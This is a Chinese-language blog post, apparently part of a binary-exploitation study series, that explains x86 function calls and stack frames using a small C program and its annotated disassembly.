<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">MyFunc</span><span class="params">(<span class="type">int</span> parameter1, <span class="type">char</span> parameter2)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> local1 = <span class="number">9</span>;</span><br><span class="line"><span class="type">char</span> local2 = ‘Z’;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">MyFunc(<span class="number">7</span>, ‘<span class="number">8</span>’);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​	如上是一个简单的 C 语言程序，其内存布局将会如下所示：</p>
<p>![程序内存布局](&#x2F;Users&#x2F;brian&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20210917232305924.png)</p>
<p>​												      图2:程序的内存布局</p>
<p>​		EBP 是一个指向栈底的静态指针。栈底是一个固定地址，更准确地说，EBP 寄存器包含堆栈底部的地址，作为相对于执行函数的偏移量。根据函数的任务，堆栈大小在运行时由内核动态调整。 每次调用新函数时，EBP 的旧值首先被压入堆栈，然后将 ESP 的新值移至 EBP。EBP 持有的 ESP 的这个新值成为局部变量的引用基础，这些变量需要检索分配给新函数调用的堆栈部分。</p>
<p>​		如前所述，堆栈向下增长到较低的内存地址。 这是堆栈在包括 Intel、Motorola、SPARC 和 MIPS 处理器在内的许多计算机上增长的方式。堆栈指针 (ESP) 指向堆栈上的最后一个地址，而不是堆栈顶部之后的下一个空闲可用地址。</p>
<p>​		一个函数在被调用时必须做的第一件事是保存之前的 EBP（便于它可以通过在函数退出时复制到 EIP 来恢复）。 然后它将 ESP 复制到 EBP 中以创建新的堆栈帧指针，并推进 ESP 为局部变量保留空间。这些代码被称为 <strong>procedure prolog</strong>。函数退出时必须再次清理栈，有时这被称为 <strong>procedure epilog</strong>。您可能会发现 Intel 提供了  ENTER 和 LEAVE 指令以及 Motorola 的 LINK 和 UNLINK 指令来高效地执行大部分 procedure prolog 和 procedure epilog 工作。</p>
<h2 id="THE-FUNCTION-CALL-AND-STACK-FRAME-SOME-ANALYSIS"><a href="#THE-FUNCTION-CALL-AND-STACK-FRAME-SOME-ANALYSIS" class="headerlink" title="THE FUNCTION CALL AND STACK FRAME: SOME ANALYSIS"></a>THE FUNCTION CALL AND STACK FRAME: SOME ANALYSIS</h2><p>测试代码仍然是上文提到的简单代码，反编译后的结果如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">--- e:\test\testproga\winprocess.cpp  ------------------------</span><br><span class="line">10:</span><br><span class="line">11:   int main(int argc, char *argv[])</span><br><span class="line">12:   &#123;</span><br><span class="line">00401060   push        ebp</span><br><span class="line">00401061   mov         ebp, esp</span><br><span class="line">00401063   sub         esp, 40h</span><br><span class="line">00401066   push        ebx</span><br><span class="line">00401067   push        esi</span><br><span class="line">00401068   push        edi</span><br><span class="line">00401069   lea         edi, [ebp-40h]</span><br><span class="line">0040106C   mov         ecx, 10h</span><br><span class="line">00401071   mov         eax, 0CCCCCCCCh</span><br><span class="line">00401076   rep stos    dword ptr [edi]</span><br><span class="line">13:   MyFunc(7,&#x27;8&#x27;);</span><br><span class="line">------------------jump to MyFunc()----------------------------</span><br><span class="line">00401078   push        38h ;character 8 is pushed on the stack at [ebp+12]</span><br><span class="line">0040107A   push        7   ;integer 7 is pushed on the stack at [ebp+8]</span><br><span class="line">0040107C   call        @ILT+5(MyFunc) (0040100a);call MyFunc(), return address: 00401081 is pushed on the stack at [ebp+4]</span><br><span class="line">--------------------------------------------------------------</span><br><span class="line">@ILT+5(?MyFunc@@YAHHD@Z):  ;function decorated name, Visual C++ .Net</span><br><span class="line">0040100A   jmp         MyFunc (00401020)</span><br><span class="line">--- e:\test\testproga\testproga.cpp  -------------------------</span><br><span class="line">1:    //testproga.cpp</span><br><span class="line">2:    #include &lt;stdio.h&gt;</span><br><span class="line">3:</span><br><span class="line">4:    int MyFunc(int parameter1, char parameter2)</span><br><span class="line">5:    &#123;</span><br><span class="line">00401020   push        ebp        ;save the previous frame pointer at [ebp+0]</span><br><span class="line">00401021   mov         ebp, esp   ;the esp (top of the stack) becomes new ebp. The esp and ebp now are pointing to the same address.</span><br><span class="line">00401023   sub         esp, 48h   ;subtract 72 bytes for local variables &amp; buffer,where is the esp? [ebp-72]</span><br><span class="line">00401026   push        ebx        ;save, push ebx register, [ebp-76]</span><br><span class="line">00401027   push        esi        ;save, push esi register, [ebp-80]</span><br><span class="line">00401028   push        edi        ;save, push edi register, [ebp-84]</span><br><span class="line">00401029   lea         edi, [ebp-48h]    ;using the edi register…</span><br><span class="line">0040102C   mov         ecx, 12h</span><br><span class="line">00401031   mov         eax, 0CCCCCCCCh</span><br><span class="line">00401036   rep stos    dword ptr [edi]</span><br><span class="line">6:    int local1 = 9;</span><br><span class="line">00401038   mov         dword ptr [ebp-4], 9     ;move the local variable, integer 9 by pointer at [ebp-4]</span><br><span class="line">7:    char local2 = &#x27;Z&#x27;;</span><br><span class="line">0040103F   mov         byte ptr [ebp-8], 5Ah    ;move local variable, character Z by pointer at [ebp-8], no buffer usage in this program so can start dismantling the stack</span><br><span class="line">8:    return 0;</span><br><span class="line">00401043   xor         eax, eax   ;clear eax register, no return data</span><br><span class="line">9:    &#125;</span><br><span class="line">00401045   pop         edi        ;restore, pop edi register, [ebp-84]</span><br><span class="line">00401046   pop         esi        ;restore, pop esi register, [ebp-80]</span><br><span class="line">00401047   pop         ebx        ;restore, pop ebx register, [ebp-76]</span><br><span class="line">00401048   mov         esp, ebp   ;move ebp into esp, [ebp+0]. At this moment the esp and ebp are pointing at the same address</span><br><span class="line">0040104A   pop         ebp        ;then pop the saved ebp, [ebp+0] so the ebp is back pointing at the previous stack frame</span><br><span class="line">0040104B   ret                    ;load the saved eip, the return address: 00401081 into the eip and start executing the instruction,the address is [ebp+4]</span><br><span class="line">-----------------------------back to main()-------------------</span><br><span class="line">00401081   add         esp, 8     ;clear the parameters, 8 bytes for integer 7 and character 8 at [ebp+8] and [ebp+12] after this cleanup by the caller, main(), the MyFunc()’s stack is totally dismantled.</span><br><span class="line">14:   return 0;</span><br><span class="line">00401084   xor         eax, eax   ;clear eax register</span><br><span class="line">15:   &#125;</span><br><span class="line">00401086   pop         edi</span><br><span class="line">00401087   pop         esi</span><br><span class="line">00401088   pop         ebx</span><br><span class="line">00401089   add         esp, 40h</span><br><span class="line">0040108C   cmp         ebp, esp</span><br><span class="line">0040108E   call        __chkesp (004010b0)    ; checking the esp corruption?</span><br><span class="line">00401093   mov         esp, ebp               ; dismantling the stack</span><br><span class="line">00401095   pop         ebp</span><br><span class="line">00401096   ret</span><br></pre></td></tr></table></figure>

<ol>
<li><p>将参数从右到左 PUSH 入堆栈。</p>
<p>​		参数被 PUSH 入堆栈，从右到左一次一个。 调用代码必须跟踪有多少字节的参数被压入堆栈，以便稍后清理它。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00401078   push        38h;character 8 is pushed on the stack at [ebp+12]</span><br><span class="line"></span><br><span class="line">0040107A   push        7    ;integer 7 is pushed on the stack at [ebp+8]</span><br></pre></td></tr></table></figure>
</li>
<li><p>函数调用</p>
<p>​		处理器将 EIP 的内容压入堆栈，它指向 CALL 指令后的第一个字节，即函数的返回地址。 完成后，调用者失去控制，被调用者负责。 这一步不会改变 EBP 寄存器，即当前堆栈帧指针。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0040107C   call        @ILT+5(MyFunc) (0040100a) ;call MyFunc(), return address:00401081, is pushed on the stack at [ebp+4]</span><br></pre></td></tr></table></figure>
</li>
<li><p>保存并且更新 EBP</p>
<p>​		现在我们在新函数中，我们需要一个新的 EBP 指向的本地堆栈帧，所以这是通过保存当前的 EBP（属于前一个函数的帧，可能包括 main()）并使 其指向栈顶。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">00401020  push    ebp      ;save the previous frame pointer at [ebp+0]</span><br><span class="line">00401021  mov     ebp, esp  ;the esp (top of the stack) becomes new ebp.The esp and ebp now are pointing to the same address.</span><br></pre></td></tr></table></figure>

<p>​		一但 EBP 被更改，我们可以直接引用函数的参数（在第 1 步中PUSH）为 [ebp + 8]、[ebp +12] 等。注意 [ebp+0] 是旧的基指针（帧指针），而 [ebp+4] 是旧指令指针（EIP），即函数的返回地址。</p>
</li>
<li><p>为本地变量和 BUFFER 分配空间</p>
<p>​		只需将堆栈<strong>栈顶指针</strong>递减所需的空间量即可。 这总是在四字节块（32 位系统）中完成。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00401023   sub    esp, 48h ;subtract 72 bytes for local variables &amp; buffer,where is the esp? [ebp-72]</span><br></pre></td></tr></table></figure>
</li>
<li><p>保存用于临时的处理寄存器(Save processor registers used for temporaries)</p>
<p>​		如果此函数将使用任何处理器寄存器，则必须先保存旧值，以免破坏调用者或其他程序使用的数据。 每个要使用的寄存器一次一个地压入堆栈，编译器必须记住它做了什么，以便以后可以展开它。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00401026   push        ebx       ;save, push ebx register, [ebp-76]</span><br><span class="line">00401027   push        esi       ;save, push esi register, [ebp-80]</span><br><span class="line">00401028   push        edi       ;save, push edi register, [ebp-84]</span><br></pre></td></tr></table></figure>
</li>
<li><p>PUSH本地变量</p>
<p>​		现在，局部变量位于作为基址的 EBP 和作为堆栈顶部的 ESP 寄存器之间的堆栈上。 如前所述，按照惯例，EBP 寄存器用作堆栈帧引用上数据的偏移量。 这意味着 [ebp-4] 指的是第一个局部变量。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">6:    int local1 = 9;</span><br><span class="line">00401038   mov   dword ptr [ebp-4], 9    ;move the local variable, integer 9 by pointer at [ebp-4]</span><br><span class="line">7:    char local2 = &#x27;Z&#x27;;</span><br><span class="line">0040103F   mov   byte ptr [ebp-8], 5Ah   ;move local variable character Z by pointer at [ebp-8],no buffer usage in this program so can start dismantling the stack</span><br></pre></td></tr></table></figure>
</li>
<li><p>函数执行的任务</p>
<p>​		此时，堆栈帧已正确设置，如图 3 所示。所有参数和局部变量引用都是 EBP 寄存器的偏移量。 在我们的程序中，没有对该函数进行操作。 所以可以开始拆解函数的堆栈了。</p>
<p>​		该函数可以自由使用在进入时已保存到堆栈中的任何 ebx、esi 和 edi 寄存器，但它不得更改堆栈指针 (EBP)。</p>
</li>
</ol>
<p><img src="https://www.tenouk.com/Bufferoverflowc/Bufferoverflow2_files/image011.png" alt="Stack frame setup"></p>
<p>​														图3:程序栈帧布局</p>
<ol start="8">
<li><p>恢复保存的寄存器</p>
<p>​		函数操作完成后，对于每个进入堆栈时保存到堆栈中的寄存器，必须以相反的顺序从堆栈中恢复。 如果保存和恢复阶段不完全匹配，堆栈将被破坏。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00401045   pop     edi     ;restore, pop edi register, [ebp-84]</span><br><span class="line">00401046   pop     esi     ;restore, pop esi register, [ebp-80]</span><br><span class="line">00401047   pop     ebx     ;restore, pop ebx register, [ebp-76]</span><br></pre></td></tr></table></figure>
</li>
<li><p>恢复旧的基指针</p>
<p>​		这个函数在进入时做的第一件事是保存调用者的 EBP 基指针，通过现在恢复它（从堆栈中弹出），我们有效地丢弃了整个本地堆栈帧并将调用者的帧放回之前的状态 .</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">00401048   mov     esp, ebp ;move ebp into esp, [ebp+0]. At this moment the esp and ebp are pointing at the same address</span><br><span class="line">0040104A   pop     ebp      ;then pop the saved ebp, [ebp+0] so the ebp is back pointing at the previous stack frame</span><br></pre></td></tr></table></figure>
</li>
<li><p>从函数中返回</p>
<p>​		这是被调用函数的最后一步，RET指令从堆栈中弹出保存的旧的EIP（返回地址）并跳转到该位置。 这将控制权交还给调用者。 只有堆栈指针 (EBP) 和指令指针 (EIP) 被子程序返回修改。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0040104B   ret   ;load the saved eip, the return address: 00401081 into the eip and start executing the instruction, the address is [ebp+4]</span><br></pre></td></tr></table></figure>
</li>
<li><p>清理被 PUSH 的参数</p>
<p>​		在 __cdecl 约定中，调用者必须清除压入堆栈的参数，这可以通过将堆栈弹出到函数参数的无关寄存器或直接将参数块大小添加到堆栈指针来完成 .</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00401081   add      esp, 8 ;clear the parameters, 8 bytes for integer 7 and character 8 at [ebp+8] and [ebp+12] after this cleanup by the caller, main(),the MyFunc()’s stack is totally dismantled.</span><br></pre></td></tr></table></figure></li>
</ol>
<p>​        你也可以从汇编的角度看到，在使用堆栈时，它必须在 PUSH 和 POP 的字节数方面对称。 如前所述，函数的堆栈构造前后必须有平衡。 显然，如果堆栈在退出函数时不平衡，则程序执行将从错误的地址开始，这几乎只会使程序崩溃。 在大多数情况下，如果您将给定的数据大小压入堆栈，请确保您必须弹出相同的数据大小。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/09/21/BO6-%E5%87%BD%E6%95%B0%E6%A0%88/" data-id="cl6x1oiiz00016mgq4gugh9rn" data-title="函数栈" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>

    </footer>
  </div>
  
</article>



  


</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Categories</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/pwn/">pwn</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/WP/" rel="tag">WP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/adword/" rel="tag">adword</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/" rel="tag">格式化字符串漏洞</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/WP/" style="font-size: 10px;">WP</a> <a href="/tags/adword/" style="font-size: 10px;">adword</a> <a href="/tags/ctf/" style="font-size: 10px;">ctf</a> <a href="/tags/pwn/" style="font-size: 20px;">pwn</a> <a href="/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/" style="font-size: 10px;">格式化字符串漏洞</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/06/">June 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">October 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">September 2021</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2022/06/28/adworld-pwn/">攻防世界-新手区</a>
          </li>
        
          <li>
            <a href="/2022/06/22/Format%20String%20Vulnerailites/">格式化字符串漏洞</a>
          </li>
        
          <li>
            <a href="/2021/10/11/BO9-shellcode/">shell code</a>
          </li>
        
          <li>
            <a href="/2021/10/09/BO8-%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/">栈缓冲区溢出</a>
          </li>
        
          <li>
            <a href="/2021/10/09/BO7-%E6%A0%88%E6%93%8D%E4%BD%9C/">栈操作</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2022 John Doe<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.4.1.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>